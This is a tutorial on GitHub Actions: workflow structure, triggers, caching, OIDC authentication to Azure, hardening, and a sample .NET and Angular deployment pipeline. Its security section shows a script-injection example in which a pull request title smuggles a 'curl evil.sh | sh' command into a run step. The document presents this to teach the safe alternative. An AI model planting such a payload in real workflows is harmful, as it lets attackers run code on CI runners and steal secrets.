title: 02 — GitHub Actions in Depth
html:
02 — GitHub Actions in Depth

Everything from workflow syntax to a production .NET + Angular pipeline deploying to Azure with no stored secrets.

1. The object model

Repository
└── .github/workflows/*.yml        ← one file = one WORKFLOW
    └── Workflow
        ├── on:          triggers (events)
        ├── env:         workflow-level variables
        ├── permissions: GITHUB_TOKEN scopes
        └── jobs:
            └── Job (runs on ONE runner, isolated filesystem)
                ├── runs-on / container / services
                ├── needs:       dependencies between jobs
                ├── strategy:    matrix
                ├── environment: protection rules + secrets
                └── steps:
                    └── Step  =  `uses:` an action   OR   `run:` a shell command

Facts that trip people up:

  • Jobs run in parallel by default and each gets a fresh runner. Nothing on disk survives between jobs — you must use artifacts or cache.
  • Steps within a job share the filesystem and the working directory, but not shell state: each run: is a new shell process, so export FOO=bar doesn't persist. Use $GITHUB_ENV.
  • Jobs communicate through outputs, artifacts, or external storage.
# Passing state between steps and jobs
- name: Compute version
  id: version
  run: |
    VERSION="1.4.${{ github.run_number }}+${GITHUB_SHA::7}"
    echo "value=$VERSION" >> "$GITHUB_OUTPUT"     # step output
    echo "APP_VERSION=$VERSION" >> "$GITHUB_ENV"  # env var for later STEPS in this job

- run: echo "Building ${{ steps.version.outputs.value }}"

jobs:
  build:
    outputs:
      version: ${{ steps.version.outputs.value }}   # promote a step output to a JOB output
  deploy:
    needs: build
    steps:
      - run: echo "Deploying ${{ needs.build.outputs.version }}"

2. Triggers

on:
  push:
    branches: [main]
    paths: ['src/**', '!**/*']          # path filters — essential in a monorepo
    tags: ['v*']
  pull_request:
    branches: [main]
    types: [opened, synchronize, reopened, ready_for_review]
  schedule:
    - cron: '0 2 * * 1-5'                  # 02:00 UTC weekdays — ALWAYS UTC
  workflow_dispatch:                        # manual run, with inputs
    inputs:
      environment:
        type: choice
        options: [dev, test, prod]
        required: true
      skip_tests:
        type: boolean
        default: false
  workflow_call:                            # makes this a REUSABLE workflow
  release:
    types: [published]
  issue_comment:
    types: [created]                        # e.g. `/deploy` ChatOps
Trigger Use
pull_request Validation. Runs against a merge commit of your branch + base
push to main Build the artifact and deploy to dev
tags: ['v*'] Release pipeline
schedule Nightly E2E, dependency audit, cost report. ⚠️ Cron is UTC, and GitHub may delay runs at peak times
workflow_dispatch Manual deploy / re-run with parameters
workflow_call Reusable workflow invoked by others
repository_dispatch Triggered by an external system via the API

⚠️ schedule triggers are disabled automatically after 60 days of repository inactivity. A nightly job that silently stopped is a classic surprise.

Concurrency — stop wasting runners and prevent racing deploys:

concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true        # a new push cancels the old PR run

# For deployments, the opposite: queue rather than cancel
concurrency:
  group: deploy-production
  cancel-in-progress: false       # never cancel a half-finished deploy

3. Runners

Type Notes
ubuntu-latest Fastest and cheapest. Default choice
windows-latest Only if you need Windows-specific builds (net48, MSI, Windows containers)
macos-latest iOS/macOS builds; most expensive per minute
Larger runners 4/8/16/32/64-core; you pay more per minute but often less overall, because developer waiting time is the real cost
Self-hosted Private network access (an on-prem database, a private Azure endpoint), special hardware, or licensing

⚠️ Self-hosted runners and public repos are a dangerous combination — a fork PR can execute arbitrary code on your runner, inside your network. Never attach a self-hosted runner to a public repository without ephemeral, isolated runners.

💡 For Azure private-endpoint deployments, use a self-hosted runner in an Azure VNet, or a GitHub-hosted runner with an Azure Private Network connection (GitHub-hosted runners in your VNet) 🔄.

4. Caching and artifacts — the difference matters

Cache Artifact
Purpose Speed up a job (dependencies, build intermediates) Pass files between jobs, or publish a result
Guaranteed? No — a miss just means a slow run Yes
Retention Evicted (LRU, 7 days unused, 10 GB per repo) 🔄 Configurable, default 90 days
Scope Branch + fallbacks to the default branch Workflow run 
# NuGet caching — key on the lock/props files that determine the graph
- uses: actions/cache@v4
  with:
    path: ~/.nuget/packages
    key: nuget-${{ runner.os }}-${{ hashFiles('**/packages.lock.json', '**/*.csproj', 'Directory.Packages.props') }}
    restore-keys: |
      nuget-${{ runner.os }}-

# npm — setup-node has caching built in; prefer it
- uses: actions/setup-node@v4
  with:
    node-version: '22'
    cache: 'npm'
    cache-dependency-path: ClientApp/package-lock.json

# Artifacts (v4: faster, but note each upload must have a UNIQUE name in a run)
- uses: actions/upload-artifact@v4
  with:
    name: api-${{ github.run_id }}
    path: ./publish
    retention-days: 7
- uses: actions/download-artifact@v4
  with: { name: api-${{ github.run_id }}, path: ./publish }

💡 Use central package management (Directory.Packages.props) plus packages.lock.json and dotnet restore --locked-mode — you get deterministic restores and a precise cache key.

⚠️ Never cache anything that must be verified fresh — a cached node_modules can mask a lockfile change and a cached build output can hide a compile error.

5. Matrix builds

strategy:
  fail-fast: false                 # ⚠️ default true: one failure cancels all the others
  max-parallel: 4
  matrix:
    dotnet: ['8.0.x', '10.0.x']
    os: [ubuntu-latest, windows-latest]
    include:
      - dotnet: '10.0.x'
        os: ubuntu-latest
        primary: true              # add a property to one combination
    exclude:
      - dotnet: '8.0.x'
        os: windows-latest
runs-on: ${{ matrix.os }}

fail-fast: false is usually what you want during a compatibility sweep — you want to know all the combinations that broke, not just the first.

6. Permissions and GITHUB_TOKEN

Every run gets an automatically-generated GITHUB_TOKEN. Scope it down.

permissions: {}                    # deny everything at the workflow level

jobs:
  build:
    permissions:
      contents: read               # then grant per job, minimally
  deploy:
    permissions:
      contents: read
      id-token: write              # REQUIRED for OIDC — see §7
    # ...
  comment:
    permissions:
      pull-requests: write         # only this job can comment

💡 Set the repository/organisation default workflow permissions to read-only in Settings → Actions. Then jobs must opt in explicitly, which makes over-permissioned workflows visible in review.

⚠️ GITHUB_TOKEN cannot trigger other workflows (deliberate loop prevention). If a workflow pushes a commit or opens a PR that must trigger CI, you need a PAT or a GitHub App token — and then you need to think carefully about the loop.

7. ⭐ Authenticating to Azure with OIDC (no secrets)

This is the single most important thing in this file. Instead of storing a service-principal client secret, GitHub issues a short-lived OIDC token describing the workflow, and Azure trusts it via a federated credential.

sequenceDiagram
    participant W as GitHub Actions job
    participant G as GitHub OIDC provider
    participant E as Microsoft Entra ID
    participant A as Azure resources
    W->>G: request an OIDC token (needs id-token: write)
    G-->>W: JWT with claims:<br/>iss=token.actions.githubusercontent.com<br/>sub=repo:org/repo:environment:production<br/>aud=api://AzureADTokenExchange
    W->>E: exchange the JWT (azure/login)
    E->>E: match sub + iss against a FEDERATED CREDENTIAL<br/>on the app registration / managed identity
    E-->>W: short-lived Azure access token
    W->>A: deploy, using RBAC granted to that identity

7.1 Setting it up

# 1. Create an app registration (or better: a user-assigned managed identity)
az ad app create --display-name "gh-myapp-prod"
APP_ID=$(az ad app list --display-name "gh-myapp-prod" --query "[0].appId" -o tsv)
az ad sp create --id "$APP_ID"

# 2. Add a federated credential. The `subject` MUST match the token's `sub` claim exactly.
az ad app federated-credential create --id "$APP_ID" --parameters '{
  "name": "github-prod-env",
  "issuer": "https://token.actions.githubusercontent.com",
  "subject": "repo:my-org/my-repo:environment:production",
  "audiences": ["api://AzureADTokenExchange"]
}'

# 3. Grant Azure RBAC — scoped as narrowly as possible
az role assignment create \
  --assignee "$APP_ID" \
  --role "Contributor" \
  --scope "/subscriptions/$SUB_ID/resourceGroups/rg-myapp-prod"

Subject claim formats — getting this wrong is the #1 setup failure (it fails with an unhelpful error):

Scenario subject
A specific branch repo:my-org/my-repo:ref:refs/heads/main
A GitHub Environment 💡 repo:my-org/my-repo:environment:production
Any pull request repo:my-org/my-repo:pull_request
A tag repo:my-org/my-repo:ref:refs/tags/v1.0.0

💡 Use GitHub Environments as the subject. It's the cleanest model: the environment carries approvals and branch restrictions, and the federated credential is bound to it — so a job can only get production credentials if it runs against the production environment, which requires approval.

🔄 Two recent developments to know:

  • Azure "flexible federated identity credentials" use pattern matching, so one credential can cover many workflow scenarios instead of managing dozens of individual entries (preview at time of writing — verify GA status).
  • For repositories created, renamed, or transferred after 15 July 2026, GitHub offers an immutable default sub claim that includes owner and repository IDs rather than names — so a repo rename doesn't silently break your federation.

7.2 Using it

permissions:
  id-token: write        # ⚠️ without this, azure/login fails with "Not all values are present"
  contents: read

steps:
  - uses: azure/login@v2
    with:
      client-id:       ${{ secrets.AZURE_CLIENT_ID }}       # not a secret, but conventional
      tenant-id:       ${{ secrets.AZURE_TENANT_ID }}
      subscription-id: ${{ secrets.AZURE_SUBSCRIPTION_ID }}

  - run: az account show          # now authenticated; the token lives ~1 hour

🧪 Audit your federated credentials regularly — stale or overly broad trust relationships are a real risk:

az ad app federated-credential list --id "$APP_ID" -o table

8. Environments — approvals, secrets, and protection

jobs:
  deploy-prod:
    environment:
      name: production
      url: https://api.example.com        # shown in the UI and the deployments tab

Configured in Settings → Environments, an environment gives you:

  • Required reviewers — the job pauses until someone approves.
  • Wait timer — a forced delay (useful for a soak period between stages).
  • Deployment branch rules — only main or a tag pattern may deploy here.
  • Environment secrets and variables — scoped so a dev job can't read production values.
  • A deployment history with who approved and when.

💡 Environments + OIDC + branch rules together give you defence in depth: even a compromised workflow file on a feature branch cannot obtain production credentials.

9. ⚠️ Security hardening (read this section twice)

Risk Mitigation
A compromised third-party action steals your secrets Pin to a full commit SHA, not a tag. Tags are mutable
Over-permissioned token permissions: {} at the top, grant per job
pull_request_target with a checkout of PR code ☠️ The classic critical vulnerability. This trigger runs with write permissions and repository secrets, in the context of the base repo. Checking out and executing the fork's code hands an attacker your secrets
Script injection via untrusted input Never interpolate ${{ github.event.issue.title }} etc. directly into a run: block — it's substituted as shell text. Pass via env: and reference "$TITLE"
Secrets in logs GitHub masks known secret values, but not derived ones (base64, substrings). Don't echo them
Self-hosted runners on public repos Don't. Or use ephemeral, isolated runners
Fork PRs By default they get a read-only token and no secrets. Keep it that way 
# ❌ Script injection — a PR titled  a"; curl evil.sh | sh; #  executes on your runner
- run: echo "Title: ${{ github.event.pull_request.title }}"

# ✔ Pass through the environment; the shell treats it as data, never as code
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "Title: $TITLE"

# ✔ Pin actions to a SHA, with the version in a comment for readability
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683   # v4.2.2

💡 Automate the pinning and updating with Dependabot (.github/dependabot.yml with package-ecosystem: "github-actions") — it bumps the SHA and updates the comment.

10. Reusable workflows vs composite actions

Reusable workflow Composite action
Defines Whole jobs (own runners, environments, secrets) A group of steps inside someone else's job
Called with uses: at the job level uses: at the step level
Can use environment:, strategy:, multiple runners ✔ ✘
Best for A standard build-and-deploy pipeline shared across repos A repeated sequence of steps (setup + login + version) 
# .github/workflows/reusable-deploy.yml
on:
  workflow_call:
    inputs:
      environment:   { required: true,  type: string }
      app-name:      { required: true,  type: string }
      resource-group:{ required: true,  type: string }
      artifact-name: { required: true,  type: string }
    secrets:
      AZURE_CLIENT_ID:       { required: true }
      AZURE_TENANT_ID:       { required: true }
      AZURE_SUBSCRIPTION_ID: { required: true }

jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: ${{ inputs.environment }}
    permissions: { id-token: write, contents: read }
    steps:
      - uses: actions/download-artifact@v4
        with: { name: ${{ inputs.artifact-name }}, path: ./publish }
      - uses: azure/login@v2
        with:
          client-id:       ${{ secrets.AZURE_CLIENT_ID }}
          tenant-id:       ${{ secrets.AZURE_TENANT_ID }}
          subscription-id: ${{ secrets.AZURE_SUBSCRIPTION_ID }}
      - uses: azure/webapps-deploy@v3
        with:
          app-name:   ${{ inputs.app-name }}
          slot-name:  staging
          package:    ./publish

# Calling it
jobs:
  deploy-prod:
    needs: build
    uses: ./.github/workflows/reusable-deploy.yml     # or my-org/shared-workflows/.github/...@v1
    with:
      environment: production
      app-name: app-myapi-prod
      resource-group: rg-myapp-prod
      artifact-name: api-${{ github.run_id }}
    secrets: inherit

💡 Centralise reusable workflows in a shared-workflows repository and reference them by tag. From the second service onward, this saves you from the 15-copies-drifting-apart problem.

11. Full production pipeline: .NET API + Angular SPA → Azure

name: Build and Deploy

on:
  push:
    branches: [main]
    paths-ignore: ['**/*', 'docs/**']
  pull_request:
    branches: [main]
  workflow_dispatch:

concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: ${{ github.event_name == 'pull_request' }}

permissions: {}

env:
  DOTNET_VERSION: '10.0.x'
  NODE_VERSION: '22'
  DOTNET_SKIP_FIRST_TIME_EXPERIENCE: true
  DOTNET_NOLOGO: true

jobs:
  # ───────────────────────── 1. Build & test backend ─────────────────────────
  backend:
    runs-on: ubuntu-latest
    permissions: { contents: read }
    outputs:
      version: ${{ steps.version.outputs.value }}
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683   # v4.2.2
        with: { fetch-depth: 0 }        # full history for versioning tools

      - uses: actions/setup-dotnet@v4
        with: { dotnet-version: ${{ env.DOTNET_VERSION }} }

      - uses: actions/cache@v4
        with:
          path: ~/.nuget/packages
          key: nuget-${{ hashFiles('**/packages.lock.json', 'Directory.Packages.props') }}
          restore-keys: nuget-

      - id: version
        run: echo "value=1.4.${{ github.run_number }}+${GITHUB_SHA::7}" >> "$GITHUB_OUTPUT"

      - run: dotnet restore --locked-mode

      - name: Verify formatting
        run: dotnet format --verify-no-changes --no-restore

      - run: dotnet build -c Release --no-restore -warnaserror

      - name: Unit tests
        run: >
          dotnet test --no-build -c Release
          --logger trx --results-directory ./TestResults
          --collect:"XPlat Code Coverage"
          --filter "Category!=Integration"

      - name: Integration tests (Testcontainers)
        run: dotnet test --no-build -c Release --filter "Category=Integration"
        # Docker is available on ubuntu-latest, so Testcontainers just works

      - uses: dorny/test-reporter@v1
        if: always()                     # publish results even when tests fail
        with:
          name: .NET tests
          path: TestResults/*.trx
          reporter: dotnet-trx

      - name: Publish
        run: >
          dotnet publish src/Api/Api.csproj -c Release -o ./publish
          --no-build /p:Version=${{ steps.version.outputs.value }}

      - uses: actions/upload-artifact@v4
        with: { name: api-${{ github.run_id }}, path: ./publish, retention-days: 7 }

  # ───────────────────────── 2. Build frontend (parallel) ────────────────────
  frontend:
    runs-on: ubuntu-latest
    permissions: { contents: read }
    defaults: { run: { working-directory: ./ClientApp } }
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
      - uses: actions/setup-node@v4
        with:
          node-version: ${{ env.NODE_VERSION }}
          cache: npm
          cache-dependency-path: ClientApp/package-lock.json
      - run: npm ci
      - run: npm run lint
      - run: npm run test -- --watch=false --browsers=ChromeHeadless
      - run: npm run build -- --configuration production
      - uses: actions/upload-artifact@v4
        with: { name: web-${{ github.run_id }}, path: ClientApp/dist/browser }

  # ───────────────────────── 3. Security scanning ────────────────────────────
  security:
    runs-on: ubuntu-latest
    permissions: { contents: read, security-events: write }
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
      - uses: github/codeql-action/init@v3
        with: { languages: csharp, javascript-typescript }
      - uses: actions/setup-dotnet@v4
        with: { dotnet-version: ${{ env.DOTNET_VERSION }} }
      - run: dotnet build -c Release
      - uses: github/codeql-action/analyze@v3

      - name: Vulnerable NuGet packages
        run: |
          dotnet list package --vulnerable --include-transitive 2>&1 | tee out.txt
          grep -q "has the following vulnerable packages" out.txt && exit 1 || exit 0

      - uses: gitleaks/gitleaks-action@v2
        env: { GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }} }

  # ───────────────────────── 4. Deploy: dev (auto) ───────────────────────────
  deploy-dev:
    if: github.ref == 'refs/heads/main' && github.event_name == 'push'
    needs: [backend, frontend, security]
    uses: ./.github/workflows/reusable-deploy.yml
    with:
      environment: dev
      app-name: app-myapi-dev
      resource-group: rg-myapp-dev
      artifact-name: api-${{ github.run_id }}
    secrets: inherit

  # ───────────────────────── 5. Deploy: production (approval) ────────────────
  deploy-prod:
    needs: deploy-dev
    uses: ./.github/workflows/reusable-deploy.yml
    with:
      environment: production           # ← approval + branch rules live here
      app-name: app-myapi-prod
      resource-group: rg-myapp-prod
      artifact-name: api-${{ github.run_id }}
    secrets: inherit

11.1 The production deploy job, in full (slot swap + smoke test + rollback)

jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: { name: production, url: https://api.example.com }
    permissions: { id-token: write, contents: read }
    steps:
      - uses: actions/download-artifact@v4
        with: { name: api-${{ inputs.artifact-name }}, path: ./publish }

      - uses: azure/login@v2
        with:
          client-id:       ${{ secrets.AZURE_CLIENT_ID }}
          tenant-id:       ${{ secrets.AZURE_TENANT_ID }}
          subscription-id: ${{ secrets.AZURE_SUBSCRIPTION_ID }}

      # Migrations run ONCE, before the app rollout, and must be backward compatible
      - name: Apply database migrations
        run: |
          dotnet tool install --global dotnet-ef
          dotnet ef database update \
            --project src/Infrastructure --startup-project src/Api \
            --connection "${{ secrets.MIGRATION_CONNECTION_STRING }}"

      - name: Deploy to the staging slot
        uses: azure/webapps-deploy@v3
        with:
          app-name: app-myapi-prod
          slot-name: staging
          package: ./publish

      - name: Smoke test the staging slot
        run: |
          for i in {1..30}; do
            code=$(curl -s -o /dev/null -w "%{http_code}" \
              https://app-myapi-prod-staging.azurewebsites.net/health/ready)
            [ "$code" = "200" ] && exit 0
            sleep 5
          done
          echo "Staging slot did not become healthy"; exit 1

      - name: Swap slots
        run: az webapp deployment slot swap -g rg-myapp-prod -n app-myapi-prod --slot staging

      - name: Verify production
        id: verify
        run: |
          sleep 15
          curl -fsS https://api.example.com/health/ready

      - name: Roll back on failure
        if: failure() && steps.verify.outcome == 'failure'
        run: az webapp deployment slot swap -g rg-myapp-prod -n app-myapi-prod --slot staging
        # swapping again puts the previous version back in production

12. Deploying containers to Azure

- uses: azure/login@v2
  with: { client-id: ..., tenant-id: ..., subscription-id: ... }

- name: Log in to ACR (no admin credentials — uses the OIDC identity)
  run: az acr login --name myregistry

- uses: docker/build-push-action@v6
  with:
    context: .
    push: true
    tags: |
      myregistry.azurecr.io/myapi:${{ needs.build.outputs.version }}
      myregistry.azurecr.io/myapi:${{ github.sha }}
    cache-from: type=gha
    cache-to: type=gha,mode=max
    provenance: true                    # supply-chain attestation

- name: Scan the image
  uses: aquasecurity/trivy-action@master
  with:
    image-ref: myregistry.azurecr.io/myapi:${{ github.sha }}
    exit-code: '1'
    severity: 'CRITICAL,HIGH'

- name: Deploy to Container Apps
  run: |
    az containerapp update -n ca-myapi -g rg-myapp-prod \
      --image myregistry.azurecr.io/myapi:${{ github.sha }}

⚠️ Never enable the ACR admin user. Use the OIDC identity with the AcrPush role, and give the runtime (App Service/Container Apps/AKS) a managed identity with AcrPull.

13. Expressions, contexts, and conditionals

# Contexts:  github. | env. | vars. | secrets. | job. | steps. | runner. | needs. | inputs. | matrix.

if: github.event_name == 'push' && github.ref == 'refs/heads/main'
if: contains(github.event.head_commit.message, '[skip ci]') == false
if: startsWith(github.ref, 'refs/tags/v')
if: success()      # default — all previous steps succeeded
if: failure()      # a previous step failed
if: always()       # run regardless (use for publishing test results and cleanup)
if: cancelled()

# Functions: contains, startsWith, endsWith, format, join, toJSON, fromJSON, hashFiles

⚠️ env context is not available in jobs.<id>.if or in runs-on. Use vars (repository/org variables) or hard-code. This restriction catches everyone once.

14. Debugging a workflow

Technique How
Verbose logs Repository secret ACTIONS_STEP_DEBUG = true and ACTIONS_RUNNER_DEBUG = true
Inspect the whole event payload run: echo '${{ toJSON(github.event) }}'
Interactive shell on the runner mxschmitt/action-tmate — ⚠️ never on a workflow with production secrets
Run locally act (approximates the runner; not identical)
Lint before pushing actionlint — catches most YAML and expression errors
Re-run one failed job The UI's "Re-run failed jobs" preserves the other jobs' results
See the resolved workflow The run summary shows the effective YAML after reusable-workflow resolution

The three failures you'll hit most:

  1. azure/login fails with a token error → missing permissions: id-token: write, or the federated credential subject doesn't match exactly.
  2. A step can't find files → jobs don't share a filesystem; you needed an artifact.
  3. An if: never fires → you used the env context where it isn't available, or compared a boolean to a string.

15. Cost and efficiency

  • Public repos: free. Private: minutes are billed, and Windows costs 2× and macOS 10× the Linux rate 🔄. Build on Linux unless you can't.
  • concurrency with cancel-in-progress on PRs stops paying for superseded runs.
  • Path filters in a monorepo stop rebuilding everything for a README change.
  • Caching dependencies typically halves a .NET/npm build.
  • Larger runners often reduce total cost: a 4-core runner at 2× the rate that finishes in 40% of the time is cheaper and faster.
  • Artifacts and caches consume storage — set retention-days deliberately.

16. Checklist

  • permissions: {} at workflow level, granted minimally per job
  • All third-party actions pinned to a commit SHA; Dependabot updating them
  • OIDC to Azure — no AZURE_CREDENTIALS secret anywhere
  • Federated credential subject bound to a GitHub Environment, with required reviewers
  • No untrusted input interpolated into run: blocks
  • No pull_request_target checking out fork code
  • concurrency set — cancel on PRs, queue on deploys
  • Dependency caching with a lockfile-derived key
  • Build once; the artifact promoted to every environment
  • Test results and coverage published even on failure (if: always())
  • Security scanning (CodeQL + dependency + secret) blocking
  • Deploy to a slot, smoke test, swap, verify, auto-rollback on failure
  • Migrations as a separate step, before the app deploy, backward compatible
  • Shared logic in reusable workflows, referenced by tag
  • PR pipeline under ~10 minutes

🔍 Interview angles

  • How do you authenticate GitHub Actions to Azure without secrets? OIDC: the job requests a short-lived token (id-token: write), Azure matches its sub/iss claims against a federated credential on the app registration or managed identity, and issues an Azure token. Bind the subject to a GitHub Environment so approvals gate credential issuance.
  • Difference between a reusable workflow and a composite action? Whole jobs with their own runners and environments, vs a group of steps inside an existing job.
  • Why pin actions to a SHA? Tags are mutable — a compromised action would run with access to everything in the job.
  • What's dangerous about pull_request_target? It runs with write permissions and repository secrets in the base-repo context; checking out and executing fork code hands an attacker your secrets.
  • Jobs vs steps for sharing files? Steps share the filesystem; jobs get fresh runners — use artifacts.
